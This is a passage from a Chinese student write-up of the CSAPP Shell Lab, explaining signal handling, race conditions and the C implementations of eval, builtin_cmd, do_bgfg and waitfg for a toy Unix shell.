<p>各参数含义及使用</p>
<ul>
<li><p><strong>pid：判定等待集合成员</strong></p>
<ul>
<li>pid &gt; 0 : 等待集合为 pid 对应的单独子进程</li>
<li>pid &#x3D; -1: 等待集合为所有的子进程</li>
<li>pid &lt; -1: 等待集合为一个进程组，ID 为 pid 的绝对值</li>
<li>pid &#x3D; 0 : 等待集合为一个进程组，ID 为调用进程的 pid</li>
</ul>
</li>
<li><p><strong>options：修改默认行为</strong></p>
<ul>
<li>WNOHANG：集合中任何子进程都未终止，立即返回 0</li>
<li>WUNTRACED：阻塞，直到一个进程终止或停止，返回 PID</li>
<li>WCONTINUED：阻塞，直到一个停止的进程收到 SIGCONT 信号重新开始执行</li>
<li>也可以用或运算把 options 的选项组合起来。例如 WNOHANG | WUNTRACED 表示：立即返回，如果等待集合中的子进程都没有被停职或终止，则返回值为 0；如果有一个停止或终止，则返回值为该子进程的 PID</li>
</ul>
</li>
<li><p><strong>statusp：检查已回收子进程的退出状态</strong></p>
<ul>
<li>waitpid 会在 status 中放上关于导致返回的子进程的状态信息，很容易理解，这里就不再翻译了</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220403111407584.png" alt="image-20220403111407584"></p>
</li>
</ul>
<h2 id="回顾：并发编程原则"><a href="#回顾：并发编程原则" class="headerlink" title="回顾：并发编程原则"></a>回顾：并发编程原则</h2><p>这里仅列出在本实验中用到的原则，后面的解析也会大量提及</p>
<ol>
<li>注意保存和恢复 errno。很多函数会在出错返回式设置 errno，在处理程序中调用这样的函数可能会干扰主程序中其他依赖于 errno 的部分，解决办法是在进入处理函数时用局部变量保存它，运行完成后再将其恢复</li>
<li>访问全局数据时，阻塞所有信号。这里很容易理解，不再解释了</li>
<li>不可以用信号来对其它进程中发生的事情计数。未处理的信号是不排队的，即每种类型的信号最多只能有一个待处理信号。<strong>举例</strong>：如果父进程将要接受三个相同的信号，当处理程序还在处理一个信号时，第二个信号就会加入待处理信号集合，如果此时第三个信号到达，那么它就会被简单地丢弃，从而出现问题</li>
<li>注意考虑同步错误：竞争。我们在下面单独开一节说明</li>
</ol>
<h2 id="回顾：竞争"><a href="#回顾：竞争" class="headerlink" title="回顾：竞争"></a>回顾：竞争</h2><p>看如下例子：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220403155658148.png" alt="image-20220403155658148"></p>
<p>这是一个 Unix Shell 的框架，父进程在一个全局列表中记录子进程，并设置了一个 SIGCHLD 处理程序来回收子进程，乍一看没问题，但是考虑如下可能的事件序列：</p>
<ul>
<li>第 29 行，创建子进程运行</li>
<li>假设子进程在父进程运行到 32 行，即运行<code>addjob</code>函数之前就结束了，并发送一个 SIGCHLD 信号</li>
<li>父进程接收到信号，运行信号处理程序，调用<code>deletejob</code>函数，而这个<code>job</code>本来就没有添加入列表</li>
<li>返回父进程，调用<code>addjob</code>函数，而这个子进程已经终止并回收了，<code>job</code>已经不存在了</li>
</ul>
<p>也就是说，在这里，<code>deletejob</code>函数的调用发生在了<code>addjos</code>之前，导致错误。我们称<code>addjob</code>和<code>deletejob</code>存在竞争。</p>
<p>解决办法也就很容易想到了，即在父进程<code>folk</code>之前就阻塞 SIGCHLD 信号：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220403161137998.png" alt="image-20220403161137998"></p>
<p>这样，父进程在<code>fork</code>后，<code>addjob</code>前一定不会处理 SIGCHLD 信号，保证了<code>addjob</code>一定在<code>deletejob</code>之前执行</p>
<h1 id="错误处理包装函数"><a href="#错误处理包装函数" class="headerlink" title="错误处理包装函数"></a>错误处理包装函数</h1><p>当 Unix 系统及函数遇到错误时，它们通常会返回 -1，并设置全局整型变量<code>errno</code>来表示什么出错了。为了能让程序检查错误的同时代码不那么臃肿，按照书本推荐的方式，我编写了一套后面将要用到的错误处理包装函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Error wrapper function */</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">Fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigemptyset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Setpgid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">pid_t</span> pgid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">Fork</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">if</span>((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Fork error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigprocmask(how, <span class="built_in">set</span>, oldset) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigprocmask error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigemptyset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigemptyset(<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigprocmask error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigfillset(<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigfillset error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigaddset(<span class="built_in">set</span>, signum) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigaddset error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(execve(filename, argv, envp) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Setpgid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">pid_t</span> pgid)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(setpgid(pid, pgid) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        unix_error(<span class="string">&quot;Setpid error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> sig)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(kill(pid, sig) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        unix_error(<span class="string">&quot;Kill error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><p>这个函数功能是解析命令行后判断为内置命令还是程序路径，分别执行。如果是前台作业，则要等待其完成，如果是后台作业，则要输出其相应信息</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS];    	<span class="comment">//存放解析的参数</span></span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];      	<span class="comment">//解析cmdline</span></span><br><span class="line">    <span class="type">int</span> bg;                 	<span class="comment">//判断程序是前台还是后台执行</span></span><br><span class="line">    <span class="type">int</span> state;                  <span class="comment">//指示前台还是后台运行状态</span></span><br><span class="line">    <span class="type">pid_t</span> pid;              	<span class="comment">//执行程序的子进程的pid</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);	</span><br><span class="line">    bg = parseline(buf, argv);	<span class="comment">//解析参数</span></span><br><span class="line">    state = bg? BG:FG;          </span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>] == <span class="literal">NULL</span>)			<span class="comment">//空行，直接返回</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigemptyset(&amp;mask_one);</span><br><span class="line">    Sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv)) &#123;                            <span class="comment">//判断是否为内置命令</span></span><br><span class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);       <span class="comment">//fork前阻塞SIGCHLD信号</span></span><br><span class="line">        <span class="keyword">if</span>((pid = Fork()) == <span class="number">0</span>) &#123;						    <span class="comment">//创建子进程</span></span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);      <span class="comment">//解除子进程的阻塞</span></span><br><span class="line">            Setpgid(<span class="number">0</span>, <span class="number">0</span>);                                  <span class="comment">//创建新进程组，ID设置为进程PID</span></span><br><span class="line">            Execve(argv[<span class="number">0</span>], argv, environ);                 <span class="comment">//执行</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);                                        <span class="comment">//子线程执行完毕后一定要退出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(state==FG)&#123;</span><br><span class="line">            Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);            <span class="comment">//添加工作前阻塞所有信号</span></span><br><span class="line">            addjob(jobs, pid, state, cmdline);                  <span class="comment">//添加至作业列表</span></span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;mask_one, <span class="literal">NULL</span>);</span><br><span class="line">            waitfg(pid);                                        <span class="comment">//等待前台进程执行完毕</span></span><br><span class="line">        &#125;         </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);            <span class="comment">//添加工作前阻塞所有信号</span></span><br><span class="line">            addjob(jobs, pid, state, cmdline);                  <span class="comment">//添加至作业列表</span></span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;mask_one, <span class="literal">NULL</span>);                                 </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid), pid, cmdline);  <span class="comment">//打印后台进程信息</span></span><br><span class="line">        &#125;</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);          <span class="comment">//解除阻塞 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>注释已经写得很详细了，这里用到了消除竞争的方法。我要解释两点：</p>
<ul>
<li>为什么调用<code>printf</code>时也阻塞信号？这里打印了全局变量，而<code>printf</code>函数是线程不安全的，比如可能会出现读内存的同时另一个线程修改它的情况</li>
<li>为什么要在执行前创建新线程组？这里主要是为了将子进程组与 tsh 进程组分开，防止发信号终止子进程组时也将 tsh 进程组终止了</li>
</ul>
<p>参见 Write UP 中的提示：</p>
<blockquote>
<p>After the fork, but before the execve, the child process should call setpgid(0, 0), which puts the child in a new process group whose group ID is identical to the child’s PID. This ensures that there will be only one process, your shell, in the foreground process group.</p>
</blockquote>
<h1 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h1><p>这个函数就是简简单单判断是否为内置命令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="line"><span class="comment"> *    it immediately.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h1><p>这个函数要实现内置命令<code>bg</code>和<code>fg</code>，这两个命令的功能如下：</p>
<ul>
<li><p><code>bg &lt;job&gt;</code>：通过向<code>&lt;job&gt;</code>对应的作业发送<code>SIGCONT</code>信号来使它重启并放在后台运行 </p>
</li>
<li><p><code>fg &lt;job&gt;</code>：通过向 <code>&lt;job&gt;</code>对应的作业发送<code>SIGCONT</code>信号来使它重启并放在前台运行</p>
</li>
<li><p>输入时后面的参数有<code>%</code>则代表<code>jid</code>，没有则代表<code>pid</code></p>
</li>
</ul>
<p><code>trace14</code>主要就是用来测试这个命令，查看标准程序的输出：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220402164708317.png" alt="image-20220402164708317"></p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> <span class="literal">NULL</span>;        <span class="comment">//要处理的job</span></span><br><span class="line">    <span class="type">int</span> state;                      <span class="comment">//输入的命令</span></span><br><span class="line">    <span class="type">int</span> id;                         <span class="comment">//存储jid或pid</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) state = BG;</span><br><span class="line">        <span class="keyword">else</span> state = FG;  </span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;               <span class="comment">//没带参数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;%&#x27;</span>)&#123;             <span class="comment">//说明是jid</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;id) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            job = getjobjid(jobs, id);  <span class="comment">//获得job</span></span><br><span class="line">            <span class="keyword">if</span>(job==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, id);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;  <span class="comment">//其它符号，非法输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;                       <span class="comment">//pid</span></span><br><span class="line">        id = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">        job = getjobpid(jobs, id);</span><br><span class="line">        <span class="keyword">if</span>(job==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, id);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Kill(-(job-&gt;pid), SIGCONT);       <span class="comment">//重启进程, 这里发送到进程组</span></span><br><span class="line">    job-&gt;state = state;</span><br><span class="line">    <span class="keyword">if</span>(state==BG)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h2><p>这个代码的难点主要在于命令行参数的判断，要考虑健壮性。注意原来的后台进程可能会变成前台进程，所以应修改<code>job</code>结构体的相应信息</p>
<h1 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h1><p>这个函数从要求实现阻塞父进程，直到当前的前台进程不再是前台进程了。这里显然要显示地等待信号，我们先回顾一下相关知识</p>
<h2 id="回顾：显式地等待信号"><a href="#回顾：显式地等待信号" class="headerlink" title="回顾：显式地等待信号"></a>回顾：显式地等待信号</h2><p>考虑如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(fgpid(jobs) != <span class="number">0</span>)</span><br><span class="line">    pause();</span><br></pre></td></tr></table></figure>

<p>这里会有一个竞争，并且它可能引起致命的错误！考虑如下事件序列：</p>
<ul>
<li>父进程调用<code>fgpid</code>函数，此时有一个子进程仍然在前台运行，所以判断条件为真，进入循环</li>
<li>假定父进程在进入循环后，而执行<code>pause</code>前，子进程终止</li>
<li>父进程接收到 SIGCHLD 信号，并处理结束后才调用<code>pause</code></li>
</ul>
<p>由于<code>pause</code>仅在捕捉到信号后返回，而之后不会再有任何信号抵达，那么父进程就会永远休眠！</p>
<p>解决办法是用<code>sleep</code>函数：因为它不依赖信号来返回，通过每次循环来监测子进程状态</p>
<p>也可以用<code>sigsuspend</code>函数，这个函数相当于如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sigprocmask(SIG_SETMASK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>在调用<code>sigsuspend</code>之前阻塞 SIGCHLD 信号，调用时又通过<code>sigprocmask</code>函数，在执行<code>pause</code>函数之前解除对信号的阻塞，从而正常休眠。有同学可能会问了：这里并没有消除竞争啊？如果在第 1 行和第 2 行之间子进程终止不还是会发生永久休眠吗？</p>
<p>这就是<code>sigsuspend</code>与上述代码的不同之处了，它相当于上述代码的原子版本，即第 1 行和第 2 行总是一起发生的，不会被中断！</p>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    Sigemptyset(&amp;mask);   </span><br><span class="line">    <span class="keyword">while</span> (fgpid(jobs) != <span class="number">0</span>)&#123;</span><br><span class="line">        sigsuspend(&amp;mask);      <span class="comment">//暂停时取消阻塞,见sigsuspend用法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过上面的回顾，这段代码就很容易理解了。</p>
<h1 id="信号处理函数实现"><a href="#信号处理函数实现" class="headerlink" title="信号处理函数实现"></a>信号处理函数实现</h1><p>除了前面的 4 个函数，还要实现 3 个信号处理函数。由于他们非常相像，我放在了一起</p>
<h2 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h2><p>实现一个 SIGCHLD 信号处理函数，能够回收所有僵死进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  